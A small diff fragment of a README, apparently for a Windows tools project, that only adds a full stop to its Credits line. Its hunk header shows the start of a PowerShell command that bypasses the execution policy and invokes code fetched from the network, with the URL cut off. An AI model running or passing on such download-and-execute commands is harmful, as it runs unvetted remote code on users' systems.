@@ -37,4 +37,4 @@ powershell -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object Net.W
 ```
 
 ## Credits
-Developed by [Tools4Windows](https://github.com/Tools4Windows)
+Developed by [Tools4Windows](https://github.com/Tools4Windows).
